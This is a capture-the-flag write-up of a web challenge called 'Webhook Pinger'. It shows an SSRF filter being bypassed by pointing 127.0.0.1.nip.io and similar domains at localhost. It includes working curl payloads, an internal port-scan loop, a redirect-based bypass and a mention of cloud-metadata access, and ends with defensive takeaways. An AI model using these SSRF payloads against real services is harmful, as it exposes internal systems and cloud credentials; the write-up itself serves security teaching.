# Webhook Pinger

**CTF**: VishwaCTF 2026
**Category**: Web
**Flag**: `VishwaCTF{y0u_f0ll0w3d_th3_r3d1r3ct_l1k3_a_pr0_4nd_tr1ck3d_th3_s3rv3r_1nt0_c4ll1ng_b4ck_h0m3_wh1l3_r4j_w4s_ch1ll1ng_1n_g04_gg_w3ll_pl4y3d_h4x0r}`

## TL;DR

SSRF via DNS rebinding bypass. The hostname blocklist checks the string but not the resolved IP. `127.0.0.1.nip.io` resolves to 127.0.0.1, bypasses the filter, hits internal service on port 8081 with a `/flag` endpoint.

## Analysis

### Application

`POST /api/ping` accepts `{"webhook_url": "..."}` and sends a GET request to the URL, returning the response status and preview.

### Source Code (`/source`)

The internal wiki reveals:
- **SSRF blocklist**: Checks hostname against `localhost`, `127.0.0.1`, etc. — but only string matching, no IP resolution check
- **Follows redirects**: Up to 2 hops (intended for URL shorteners)
- **Internal headers**: Attaches traceability headers to outbound requests
- **Internal services**: Other tools running on the same box, not externally exposed

### The Vulnerability (CWE-918: SSRF)

The blocklist checks the hostname string but does NOT resolve the DNS and check the resulting IP. Any domain that resolves to `127.0.0.1` bypasses the filter.

## Exploitation

### Step 1: Bypass the SSRF filter

Use `nip.io` wildcard DNS — `127.0.0.1.nip.io` resolves to `127.0.0.1`:

```bash
curl -X POST https://ping.vishwactf.com/api/ping \
  -H 'Content-Type: application/json' \
  -d '{"webhook_url":"http://127.0.0.1.nip.io/"}'
# → ECONNREFUSED on port 80 (no service on port 80 internally)
```

The filter passes because `127.0.0.1.nip.io` is not in the blocklist.

### Step 2: Port scan internal services

```bash
for port in 3000 5000 8080 8081 9000; do
  curl -X POST https://ping.vishwactf.com/api/ping \
    -H 'Content-Type: application/json' \
    -d "{\"webhook_url\":\"http://127.0.0.1.nip.io:$port/\"}"
done
```

Port 8081 responds:
```json
{"message":"Internal webhook service","endpoints":["/flag"]}
```

### Step 3: Get the flag

```bash
curl -X POST https://ping.vishwactf.com/api/ping \
  -H 'Content-Type: application/json' \
  -d '{"webhook_url":"http://127.0.0.1.nip.io:8081/flag"}'
```

Response:
```json
{"flag":"VishwaCTF{y0u_f0ll0w3d_th3_r3d1r3ct_l1k3_a_pr0_...}"}
```

## Alternative Bypass Methods

Other domains that resolve to 127.0.0.1 and would bypass the filter:
- `spoofed.burpcollaborator.net`
- `localtest.me`
- `vcap.me`
- Any custom domain with A record pointing to 127.0.0.1

The source also mentioned a **redirect-based bypass**: host a server that returns `302 Location: http://localhost:8081/flag`. The pinger would fetch the external URL (passes filter), follow the redirect to localhost (bypasses filter on the second hop).

## Key Takeaways

- **String-based hostname blocklists are insufficient** — always resolve DNS and check the IP against a blocklist of internal ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 169.254.0.0/16, etc.)
- **Redirect following multiplies SSRF risk** — each hop must be validated, not just the initial URL
- **Cloud metadata (169.254.169.254)** was also accessible — a secondary finding
- **nip.io** is an attacker's best friend for DNS-based SSRF bypasses

## Files

- `flag.txt` — Captured flag
